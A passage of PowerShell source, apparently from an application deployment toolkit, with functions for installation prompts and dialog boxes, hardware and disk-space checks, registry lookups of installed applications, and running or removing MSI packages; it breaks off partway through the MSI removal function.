		$formInstallationPrompt.Controls.Add($buttonAbort)
		If ($buttonLeftText) { $formInstallationPrompt.Controls.Add($buttonLeft) }
		If ($buttonMiddleText) { $formInstallationPrompt.Controls.Add($buttonMiddle) }
		If ($buttonRightText) { $formInstallationPrompt.Controls.Add($buttonRight) }

		
		$timer = New-Object -TypeName 'System.Windows.Forms.Timer'
		$timer.Interval = ($timeout * 1000)
		$timer.Add_Tick({
			Write-Log -Message 'Installation action not taken within a reasonable amount of time.' -Source ${CmdletName}
			$buttonAbort.PerformClick()
		})

		
		$InitialFormInstallationPromptWindowState = $formInstallationPrompt.WindowState
		
		$formInstallationPrompt.add_Load($Form_StateCorrection_Load)
		
		$formInstallationPrompt.add_FormClosed($Form_Cleanup_FormClosed)

		
		$timer.Start()

		
		[scriptblock]$RefreshInstallationPrompt = {
			$formInstallationPrompt.BringToFront()
			$formInstallationPrompt.Location = "$($formInstallationPromptStartPosition.X),$($formInstallationPromptStartPosition.Y)"
			$formInstallationPrompt.Refresh()
		}
		If ($persistPrompt) {
			$timerPersist = New-Object -TypeName 'System.Windows.Forms.Timer'
			$timerPersist.Interval = ($configInstallationPersistInterval * 1000)
			[scriptblock]$timerPersist_Tick = { & $RefreshInstallationPrompt }
			$timerPersist.add_Tick($timerPersist_Tick)
			$timerPersist.Start()
		}

		
		Close-InstallationProgress

		[string]$installPromptLoggedParameters = ($installPromptParameters.GetEnumerator() | ForEach-Object { If ($_.Value.GetType().Name -eq 'SwitchParameter') { "-$($_.Key):`$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Boolean') { "-$($_.Key) `$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Int32') { "-$($_.Key) $($_.Value)" } Else { "-$($_.Key) `"$($_.Value)`"" } }) -join ' '
		Write-Log -Message "Displaying custom installation prompt with the non-default parameters: [$installPromptLoggedParameters]." -Source ${CmdletName}

		
		If ($NoWait) {
			
			$installPromptParameters.Remove('NoWait')
			
			[string]$installPromptParameters = ($installPromptParameters.GetEnumerator() | ForEach-Object { If ($_.Value.GetType().Name -eq 'SwitchParameter') { "-$($_.Key):`$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Boolean') { "-$($_.Key) `$" + "$($_.Value)".ToLower() } ElseIf ($_.Value.GetType().Name -eq 'Int32') { "-$($_.Key) $($_.Value)" } Else { "-$($_.Key) `"$($_.Value)`"" } }) -join ' '
			Start-Process -FilePath "$PSHOME\powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -NoLogo -WindowStyle Hidden -File `"$scriptPath`" -ReferredInstallTitle `"$Title`" -ReferredInstallName `"$installName`" -ReferredLogName `"$logName`" -ShowInstallationPrompt $installPromptParameters -AsyncToolkitLaunch" -WindowStyle 'Hidden' -ErrorAction 'SilentlyContinue'
		}
		
		Else {
			$showDialog = $true
			While ($showDialog) {
				
				If ($minimizeWindows) { $null = $shellApp.MinimizeAll() }
				
				$result = $formInstallationPrompt.ShowDialog()
				If (($result -eq 'Yes') -or ($result -eq 'No') -or ($result -eq 'Ignore') -or ($result -eq 'Abort')) {
					$showDialog = $false
				}
			}
			$formInstallationPrompt.Dispose()

			Switch ($result) {
				'Yes' { Write-Output -InputObject $buttonRightText }
				'No' { Write-Output -InputObject $buttonLeftText }
				'Ignore' { Write-Output -InputObject $buttonMiddleText }
				'Abort' {
					
					$null = $shellApp.UndoMinimizeAll()
					If ($ExitOnTimeout) {
						Exit-Script -ExitCode $configInstallationUIExitCode
					}
					Else {
						Write-Log -Message 'UI timed out but `$ExitOnTimeout set to `$false. Continue...' -Source ${CmdletName}
					}
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-DialogBox {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,Position=0,HelpMessage='Enter a message for the dialog box')]
		[ValidateNotNullorEmpty()]
		[string]$Text,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Title = $installTitle,
		[Parameter(Mandatory=$false)]
		[ValidateSet('OK','OKCancel','AbortRetryIgnore','YesNoCancel','YesNo','RetryCancel','CancelTryAgainContinue')]
		[string]$Buttons = 'OK',
		[Parameter(Mandatory=$false)]
		[ValidateSet('First','Second','Third')]
		[string]$DefaultButton = 'First',
		[Parameter(Mandatory=$false)]
		[ValidateSet('Exclamation','Information','None','Stop','Question')]
		[string]$Icon = 'None',
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Timeout = $configInstallationUITimeout,
		[Parameter(Mandatory=$false)]
		[boolean]$TopMost = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If ($deployModeNonInteractive) {
			Write-Log -Message "Bypassing Dialog Box [Mode: $deployMode]: $Text..." -Source ${CmdletName}
			Return
		}

		Write-Log -Message "Display Dialog Box with message: $Text..." -Source ${CmdletName}

		[hashtable]$dialogButtons = @{
			'OK' = 0
			'OKCancel' = 1
			'AbortRetryIgnore' = 2
			'YesNoCancel' = 3
			'YesNo' = 4
			'RetryCancel' = 5
			'CancelTryAgainContinue' = 6
		}

		[hashtable]$dialogIcons = @{
			'None' = 0
			'Stop' = 16
			'Question' = 32
			'Exclamation' = 48
			'Information' = 64
		}

		[hashtable]$dialogDefaultButton = @{
			'First' = 0
			'Second' = 256
			'Third' = 512
		}

		Switch ($TopMost) {
			$true { $dialogTopMost = 4096 }
			$false { $dialogTopMost = 0 }
		}

		$response = $Shell.Popup($Text, $Timeout, $Title, ($dialogButtons[$Buttons] + $dialogIcons[$Icon] + $dialogDefaultButton[$DefaultButton] + $dialogTopMost))

		Switch ($response) {
			1 {
				Write-Log -Message 'Dialog Box Response: OK' -Source ${CmdletName}
				Write-Output -InputObject 'OK'
			}
			2 {
				Write-Log -Message 'Dialog Box Response: Cancel' -Source ${CmdletName}
				Write-Output -InputObject 'Cancel'
			}
			3 {
				Write-Log -Message 'Dialog Box Response: Abort' -Source ${CmdletName}
				Write-Output -InputObject 'Abort'
			}
			4 {
				Write-Log -Message 'Dialog Box Response: Retry' -Source ${CmdletName}
				Write-Output -InputObject 'Retry'
			}
			5 {
				Write-Log -Message 'Dialog Box Response: Ignore' -Source ${CmdletName}
				Write-Output -InputObject 'Ignore'
			}
			6 {
				Write-Log -Message 'Dialog Box Response: Yes' -Source ${CmdletName}
				Write-Output -InputObject 'Yes'
			}
			7 {
				Write-Log -Message 'Dialog Box Response: No' -Source ${CmdletName}
				Write-Output -InputObject 'No'
			}
			10 {
				Write-Log -Message 'Dialog Box Response: Try Again' -Source ${CmdletName}
				Write-Output -InputObject 'Try Again'
			}
			11 {
				Write-Log -Message 'Dialog Box Response: Continue' -Source ${CmdletName}
				Write-Output -InputObject 'Continue'
			}
			-1 {
				Write-Log -Message 'Dialog Box Timed Out...' -Source ${CmdletName}
				Write-Output -InputObject 'Timeout'
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-HardwarePlatform {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Retrieve hardware platform information.' -Source ${CmdletName}
			$hwBios = Get-WmiObject -Class 'Win32_BIOS' -ErrorAction 'Stop' | Select-Object -Property 'Version', 'SerialNumber'
			$hwMakeModel = Get-WMIObject -Class 'Win32_ComputerSystem' -ErrorAction 'Stop' | Select-Object -Property 'Model', 'Manufacturer'

			If ($hwBIOS.Version -match 'VRTUAL') { $hwType = 'Virtual:Hyper-V' }
			ElseIf ($hwBIOS.Version -match 'A M I') { $hwType = 'Virtual:Virtual PC' }
			ElseIf ($hwBIOS.Version -like '*Xen*') { $hwType = 'Virtual:Xen' }
			ElseIf ($hwBIOS.SerialNumber -like '*VMware*') { $hwType = 'Virtual:VMWare' }
			ElseIf (($hwMakeModel.Manufacturer -like '*Microsoft*') -and ($hwMakeModel.Model -notlike '*Surface*')) { $hwType = 'Virtual:Hyper-V' }
			ElseIf ($hwMakeModel.Manufacturer -like '*VMWare*') { $hwType = 'Virtual:VMWare' }
			ElseIf ($hwMakeModel.Model -like '*Virtual*') { $hwType = 'Virtual' }
			Else { $hwType = 'Physical' }

			Write-Output -InputObject $hwType
		}
		Catch {
			Write-Log -Message "Failed to retrieve hardware platform information. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to retrieve hardware platform information: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-FreeDiskSpace {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Drive = $envSystemDrive,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Retrieve free disk space for drive [$Drive]." -Source ${CmdletName}
			$disk = Get-WmiObject -Class 'Win32_LogicalDisk' -Filter "DeviceID='$Drive'" -ErrorAction 'Stop'
			[double]$freeDiskSpace = [math]::Round($disk.FreeSpace / 1MB)

			Write-Log -Message "Free disk space for drive [$Drive]: [$freeDiskSpace MB]." -Source ${CmdletName}
			Write-Output -InputObject $freeDiskSpace
		}
		Catch {
			Write-Log -Message "Failed to retrieve free disk space for drive [$Drive]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to retrieve free disk space for drive [$Drive]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-InstalledApplication {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string[]]$Name,
		[Parameter(Mandatory=$false)]
		[switch]$Exact = $false,
		[Parameter(Mandatory=$false)]
		[switch]$WildCard = $false,
		[Parameter(Mandatory=$false)]
		[switch]$RegEx = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$ProductCode,
		[Parameter(Mandatory=$false)]
		[switch]$IncludeUpdatesAndHotfixes
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		If ($name) {
			Write-Log -Message "Get information for installed Application Name(s) [$($name -join ', ')]..." -Source ${CmdletName}
		}
		If ($productCode) {
			Write-Log -Message "Get information for installed Product Code [$ProductCode]..." -Source ${CmdletName}
		}

		
		[psobject[]]$regKeyApplication = @()
		ForEach ($regKey in $regKeyApplications) {
			If (Test-Path -LiteralPath $regKey -ErrorAction 'SilentlyContinue' -ErrorVariable '+ErrorUninstallKeyPath') {
				[psobject[]]$UninstallKeyApps = Get-ChildItem -LiteralPath $regKey -ErrorAction 'SilentlyContinue' -ErrorVariable '+ErrorUninstallKeyPath'
				ForEach ($UninstallKeyApp in $UninstallKeyApps) {
					Try {
						[psobject]$regKeyApplicationProps = Get-ItemProperty -LiteralPath $UninstallKeyApp.PSPath -ErrorAction 'Stop'
						If ($regKeyApplicationProps.DisplayName) { [psobject[]]$regKeyApplication += $regKeyApplicationProps }
					}
					Catch{
						Write-Log -Message "Unable to enumerate properties from registry key path [$($UninstallKeyApp.PSPath)]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
						Continue
					}
				}
			}
		}
		If ($ErrorUninstallKeyPath) {
			Write-Log -Message "The following error(s) took place while enumerating installed applications from the registry. `n$(Resolve-Error -ErrorRecord $ErrorUninstallKeyPath)" -Severity 2 -Source ${CmdletName}
		}

		
		[psobject[]]$installedApplication = @()
		ForEach ($regKeyApp in $regKeyApplication) {
			Try {
				[string]$appDisplayName = ''
				[string]$appDisplayVersion = ''
				[string]$appPublisher = ''

				
				If (-not $IncludeUpdatesAndHotfixes) {
					If ($regKeyApp.DisplayName -match '(?i)kb\d+') { Continue }
					If ($regKeyApp.DisplayName -match 'Cumulative Update') { Continue }
					If ($regKeyApp.DisplayName -match 'Security Update') { Continue }
					If ($regKeyApp.DisplayName -match 'Hotfix') { Continue }
				}

				
				$illegalChars = [string][System.IO.Path]::GetInvalidFileNameChars()
				$appDisplayName = $regKeyApp.DisplayName -replace $illegalChars,''
				$appDisplayVersion = $regKeyApp.DisplayVersion -replace $illegalChars,''
				$appPublisher = $regKeyApp.Publisher -replace $illegalChars,''


				
				[boolean]$Is64BitApp = If (($is64Bit) -and ($regKeyApp.PSPath -notmatch '^Microsoft\.PowerShell\.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node')) { $true } Else { $false }

				If ($ProductCode) {
					
					If ($regKeyApp.PSChildName -match [regex]::Escape($productCode)) {
						Write-Log -Message "Found installed application [$appDisplayName] version [$appDisplayVersion] matching product code [$productCode]." -Source ${CmdletName}
						$installedApplication += New-Object -TypeName 'PSObject' -Property @{
							UninstallSubkey = $regKeyApp.PSChildName
							ProductCode = If ($regKeyApp.PSChildName -match $MSIProductCodeRegExPattern) { $regKeyApp.PSChildName } Else { [string]::Empty }
							DisplayName = $appDisplayName
							DisplayVersion = $appDisplayVersion
							UninstallString = $regKeyApp.UninstallString
							InstallSource = $regKeyApp.InstallSource
							InstallLocation = $regKeyApp.InstallLocation
							InstallDate = $regKeyApp.InstallDate
							Publisher = $appPublisher
							Is64BitApplication = $Is64BitApp
						}
					}
				}

				If ($name) {
					
					ForEach ($application in $Name) {
						$applicationMatched = $false
						If ($exact) {
							
							If ($regKeyApp.DisplayName -eq $application) {
								$applicationMatched = $true
								Write-Log -Message "Found installed application [$appDisplayName] version [$appDisplayVersion] using exact name matching for search term [$application]." -Source ${CmdletName}
							}
						}
						ElseIf ($WildCard) {
							
							If ($regKeyApp.DisplayName -like $application) {
								$applicationMatched = $true
								Write-Log -Message "Found installed application [$appDisplayName] version [$appDisplayVersion] using wildcard matching for search term [$application]." -Source ${CmdletName}
							}
						}
						ElseIf ($RegEx) {
							
							If ($regKeyApp.DisplayName -match $application) {
								$applicationMatched = $true
								Write-Log -Message "Found installed application [$appDisplayName] version [$appDisplayVersion] using regex matching for search term [$application]." -Source ${CmdletName}
							}
						}
						
						ElseIf ($regKeyApp.DisplayName -match [regex]::Escape($application)) {
							$applicationMatched = $true
							Write-Log -Message "Found installed application [$appDisplayName] version [$appDisplayVersion] using contains matching for search term [$application]." -Source ${CmdletName}
						}

						If ($applicationMatched) {
							$installedApplication += New-Object -TypeName 'PSObject' -Property @{
								UninstallSubkey = $regKeyApp.PSChildName
								ProductCode = If ($regKeyApp.PSChildName -match $MSIProductCodeRegExPattern) { $regKeyApp.PSChildName } Else { [string]::Empty }
								DisplayName = $appDisplayName
								DisplayVersion = $appDisplayVersion
								UninstallString = $regKeyApp.UninstallString
								InstallSource = $regKeyApp.InstallSource
								InstallLocation = $regKeyApp.InstallLocation
								InstallDate = $regKeyApp.InstallDate
								Publisher = $appPublisher
								Is64BitApplication = $Is64BitApp
							}
						}
					}
				}
			}
			Catch {
				Write-Log -Message "Failed to resolve application details from registry for [$appDisplayName]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				Continue
			}
		}

		Write-Output -InputObject $installedApplication
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Execute-MSI {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateSet('Install','Uninstall','Patch','Repair','ActiveSetup')]
		[string]$Action = 'Install',
		[Parameter(Mandatory=$true,HelpMessage='Please enter either the path to the MSI/MSP file or the ProductCode')]
		[ValidateScript({($_ -match $MSIProductCodeRegExPattern) -or ('.msi','.msp' -contains [IO.Path]::GetExtension($_))})]
		[Alias('FilePath')]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Transform,
		[Parameter(Mandatory=$false)]
		[Alias('Arguments')]
		[ValidateNotNullorEmpty()]
		[string]$Parameters,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$AddParameters,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$SecureParameters = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$Patch,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$LoggingOptions,
		[Parameter(Mandatory=$false)]
		[Alias('LogName')]
		[string]$private:LogName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$WorkingDirectory,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$SkipMSIAlreadyInstalledCheck = $false,
		[Parameter(Mandatory=$false)]
		[switch]$IncludeUpdatesAndHotfixes = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$PassThru = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		[boolean]$PathIsProductCode = $false

		
		If ($Path -match $MSIProductCodeRegExPattern) {
			
			[boolean]$PathIsProductCode = $true

			
			Write-Log -Message 'Resolve product code to a publisher, application name, and version.' -Source ${CmdletName}

			If ($IncludeUpdatesAndHotfixes) {
				[psobject]$productCodeNameVersion = Get-InstalledApplication -ProductCode $path -IncludeUpdatesAndHotfixes | Select-Object -Property 'Publisher', 'DisplayName', 'DisplayVersion' -First 1 -ErrorAction 'SilentlyContinue'
			}
			Else {
				[psobject]$productCodeNameVersion = Get-InstalledApplication -ProductCode $path | Select-Object -Property 'Publisher', 'DisplayName', 'DisplayVersion' -First 1 -ErrorAction 'SilentlyContinue'
			}

			
			If (-not $logName) {
				If ($productCodeNameVersion) {
					If ($productCodeNameVersion.Publisher) {
						$logName = ($productCodeNameVersion.Publisher + '_' + $productCodeNameVersion.DisplayName + '_' + $productCodeNameVersion.DisplayVersion) -replace "[$invalidFileNameChars]",'' -replace ' ',''
					}
					Else {
						$logName = ($productCodeNameVersion.DisplayName + '_' + $productCodeNameVersion.DisplayVersion) -replace "[$invalidFileNameChars]",'' -replace ' ',''
					}
				}
				Else {
					
					$logName = $Path
				}
			}
		}
		Else {
			
			If (-not $logName) { $logName = ([IO.FileInfo]$path).BaseName } ElseIf ('.log','.txt' -contains [IO.Path]::GetExtension($logName)) { $logName = [IO.Path]::GetFileNameWithoutExtension($logName) }
		}

		If ($configToolkitCompressLogs) {
			
			[string]$logPath = Join-Path -Path $logTempFolder -ChildPath $logName
		}
		Else {
			
			If (-not (Test-Path -LiteralPath $configMSILogDir -PathType 'Container' -ErrorAction 'SilentlyContinue')) {
				$null = New-Item -Path $configMSILogDir -ItemType 'Directory' -ErrorAction 'SilentlyContinue'
			}
			
			[string]$logPath = Join-Path -Path $configMSILogDir -ChildPath $logName
		}

		
		If ($deployModeSilent) {
			$msiInstallDefaultParams = $configMSISilentParams
			$msiUninstallDefaultParams = $configMSISilentParams
		}
		Else {
			$msiInstallDefaultParams = $configMSIInstallParams
			$msiUninstallDefaultParams = $configMSIUninstallParams
		}

		
		Switch ($action) {
			'Install' { $option = '/i'; [string]$msiLogFile = "$logPath" + '_Install'; $msiDefaultParams = $msiInstallDefaultParams }
			'Uninstall' { $option = '/x'; [string]$msiLogFile = "$logPath" + '_Uninstall'; $msiDefaultParams = $msiUninstallDefaultParams }
			'Patch' { $option = '/update'; [string]$msiLogFile = "$logPath" + '_Patch'; $msiDefaultParams = $msiInstallDefaultParams }
			'Repair' { $option = '/f'; [string]$msiLogFile = "$logPath" + '_Repair'; $msiDefaultParams = $msiInstallDefaultParams }
			'ActiveSetup' { $option = '/fups'; [string]$msiLogFile = "$logPath" + '_ActiveSetup' }
		}

		
		If ([IO.Path]::GetExtension($msiLogFile) -ne '.log') {
			[string]$msiLogFile = $msiLogFile + '.log'
			[string]$msiLogFile = "`"$msiLogFile`""
		}

		
		If (Test-Path -LiteralPath (Join-Path -Path $dirFiles -ChildPath $path -ErrorAction 'SilentlyContinue') -PathType 'Leaf' -ErrorAction 'SilentlyContinue') {
			[string]$msiFile = Join-Path -Path $dirFiles -ChildPath $path
		}
		ElseIf (Test-Path -LiteralPath $Path -ErrorAction 'SilentlyContinue') {
			[string]$msiFile = (Get-Item -LiteralPath $Path).FullName
		}
		ElseIf ($PathIsProductCode) {
			[string]$msiFile = $Path
		}
		Else {
			Write-Log -Message "Failed to find MSI file [$path]." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to find MSI file [$path]."
			}
			Continue
		}

		
		If ((-not $PathIsProductCode) -and (-not $workingDirectory)) { [string]$workingDirectory = Split-Path -Path $msiFile -Parent }

		
		If ($transform) {
			[string[]]$transforms = $transform -split ','
			0..($transforms.Length - 1) | ForEach-Object {
				If (Test-Path -LiteralPath (Join-Path -Path (Split-Path -Path $msiFile -Parent) -ChildPath $transforms[$_]) -PathType 'Leaf') {
					$transforms[$_] = Join-Path -Path (Split-Path -Path $msiFile -Parent) -ChildPath $transforms[$_].Replace('.\','')
				}
				Else {
					$transforms[$_] = $transforms[$_]
				}
			}
			[string]$mstFile = "`"$($transforms -join ';')`""
		}

		
		If ($patch) {
			[string[]]$patches = $patch -split ','
			0..($patches.Length - 1) | ForEach-Object {
				If (Test-Path -LiteralPath (Join-Path -Path (Split-Path -Path $msiFile -Parent) -ChildPath $patches[$_]) -PathType 'Leaf') {
					$patches[$_] = Join-Path -Path (Split-Path -Path $msiFile -Parent) -ChildPath $patches[$_].Replace('.\','')
				}
				Else {
					$patches[$_] = $patches[$_]
				}
			}
			[string]$mspFile = "`"$($patches -join ';')`""
		}

		
		If ($PathIsProductCode) {
			[string]$MSIProductCode = $path
		}
		ElseIf ([IO.Path]::GetExtension($msiFile) -eq '.msi') {
			Try {
				[hashtable]$GetMsiTablePropertySplat = @{ Path = $msiFile; Table = 'Property'; ContinueOnError = $false }
				If ($transforms) { $GetMsiTablePropertySplat.Add( 'TransformPath', $transforms ) }
				[string]$MSIProductCode = Get-MsiTableProperty @GetMsiTablePropertySplat | Select-Object -ExpandProperty 'ProductCode' -ErrorAction 'Stop'
			}
			Catch {
				Write-Log -Message "Failed to get the ProductCode from the MSI file. Continue with requested action [$Action]..." -Source ${CmdletName}
			}
		}

		
		[string]$msiFile = "`"$msiFile`""

		
		[string]$argsMSI = "$option $msiFile"
		
		If ($transform) { $argsMSI = "$argsMSI TRANSFORMS=$mstFile TRANSFORMSSECURE=1" }
		
		If ($patch) { $argsMSI = "$argsMSI PATCH=$mspFile" }
		
		If ($Parameters) { $argsMSI = "$argsMSI $Parameters" } Else { $argsMSI = "$argsMSI $msiDefaultParams" }
		
		If ($AddParameters) { $argsMSI = "$argsMSI $AddParameters" }
		
		If ($LoggingOptions) { $argsMSI = "$argsMSI $LoggingOptions $msiLogFile" } Else { $argsMSI = "$argsMSI $configMSILoggingOptions $msiLogFile" }

		
		If ($MSIProductCode) {
			If ($SkipMSIAlreadyInstalledCheck) {
				[boolean]$IsMsiInstalled = $false
			}
			Else {
				If ($IncludeUpdatesAndHotfixes) {
					[psobject]$MsiInstalled = Get-InstalledApplication -ProductCode $MSIProductCode -IncludeUpdatesAndHotfixes
				}
				Else {
					[psobject]$MsiInstalled = Get-InstalledApplication -ProductCode $MSIProductCode
				}
				If ($MsiInstalled) { [boolean]$IsMsiInstalled = $true }
			}
		}
		Else {
			If ($Action -eq 'Install') { [boolean]$IsMsiInstalled = $false } Else { [boolean]$IsMsiInstalled = $true }
		}

		If (($IsMsiInstalled) -and ($Action -eq 'Install')) {
			Write-Log -Message "The MSI is already installed on this system. Skipping action [$Action]..." -Source ${CmdletName}
		}
		ElseIf (((-not $IsMsiInstalled) -and ($Action -eq 'Install')) -or ($IsMsiInstalled)) {
			Write-Log -Message "Executing MSI action [$Action]..." -Source ${CmdletName}
			
			[hashtable]$ExecuteProcessSplat =  @{ Path = $exeMsiexec
												  Parameters = $argsMSI
												  WindowStyle = 'Normal' }
			If ($WorkingDirectory) { $ExecuteProcessSplat.Add( 'WorkingDirectory', $WorkingDirectory) }
			If ($ContinueOnError) { $ExecuteProcessSplat.Add( 'ContinueOnError', $ContinueOnError) }
			If ($SecureParameters) { $ExecuteProcessSplat.Add( 'SecureParameters', $SecureParameters) }
			If ($PassThru) { $ExecuteProcessSplat.Add( 'PassThru', $PassThru) }
			
			If ($PassThru) {
				[psobject]$ExecuteResults = Execute-Process @ExecuteProcessSplat
			}
			Else {
				Execute-Process @ExecuteProcessSplat
			}
			
			Update-Desktop
		}
		Else {
			Write-Log -Message "The MSI is not installed on this system. Skipping action [$Action]..." -Source ${CmdletName}
		}
	}
	End {
		If ($PassThru) { Write-Output -InputObject $ExecuteResults }
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Remove-MSIApplications {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Name,
		[Parameter(Mandatory=$false)]
		[switch]$Exact = $false,
		[Parameter(Mandatory=$false)]
		[switch]$WildCard = $false,
		[Parameter(Mandatory=$false)]
		[Alias('Arguments')]
		[ValidateNotNullorEmpty()]
		[string]$Parameters,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$AddParameters,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[array]$FilterApplication = @(@()),
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[array]$ExcludeFromUninstall = @(@()),
		[Parameter(Mandatory=$false)]
		[switch]$IncludeUpdatesAndHotfixes = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$LoggingOptions,
		[Parameter(Mandatory=$false)]
		[Alias('LogName')]
		[string]$private:LogName,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$PassThru = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		[hashtable]$GetInstalledApplicationSplat = @{ Name = $name }
		If ($Exact) { $GetInstalledApplicationSplat.Add( 'Exact', $Exact) }
		ElseIf ($WildCard) { $GetInstalledApplicationSplat.Add( 'WildCard', $WildCard) }
		If ($IncludeUpdatesAndHotfixes) { $GetInstalledApplicationSplat.Add( 'IncludeUpdatesAndHotfixes', $IncludeUpdatesAndHotfixes) }

		[psobject[]]$installedApplications = Get-InstalledApplication @GetInstalledApplicationSplat

		Write-Log -Message "Found [$($installedApplications.Count)] application(s) that matched the specified criteria [$Name]." -Source ${CmdletName}

		
		[Collections.ArrayList]$removeMSIApplications = New-Object -TypeName 'System.Collections.ArrayList'
		If (($null -ne $installedApplications) -and ($installedApplications.Count)) {
			ForEach ($installedApplication in $installedApplications) {
				If ($installedApplication.UninstallString -notmatch 'msiexec') {
					Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName)] because uninstall string [$($installedApplication.UninstallString)] does not match `"msiexec`"." -Severity 2 -Source ${CmdletName}
					Continue
				}
				If ([string]::IsNullOrEmpty($installedApplication.ProductCode)) {
					Write-Log -Message "Skipping removal of application [$($installedApplication.DisplayName)] because unable to discover MSI ProductCode from application's registry Uninstall subkey [$($installedApplication.UninstallSubkey)]." -Severity 2 -Source ${CmdletName}
					Continue
				}

				
				If (($null -ne $FilterApplication) -and ($FilterApplication.Count)) {
					Write-Log -Message "Filter the results to only those that should be uninstalled as specified in parameter [-FilterApplication]." -Source ${CmdletName}
					[boolean]$addAppToRemoveList = $false
					ForEach ($Filter in $FilterApplication) {
						If ($Filter[2] -eq 'RegEx') {
							If ($installedApplication.($Filter[0]) -match $Filter[1]) {
								[boolean]$addAppToRemoveList = $true
								Write-Log -Message "Preserve removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of regex match against [-FilterApplication] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Filter[2] -eq 'Contains') {
							If ($installedApplication.($Filter[0]) -match [regex]::Escape($Filter[1])) {
								[boolean]$addAppToRemoveList = $true
								Write-Log -Message "Preserve removal of application [$($installedApplication.DisplayName) $($installedApplication.Version)] because of contains match against [-FilterApplication] criteria." -Source ${CmdletName}
							}
						}
						ElseIf ($Filter[2] -eq 'WildCard') {
							If ($installedApplication.($Filter[0]) -like $Filter[1]) {
								[boolean]$addAppToRemoveList = $true
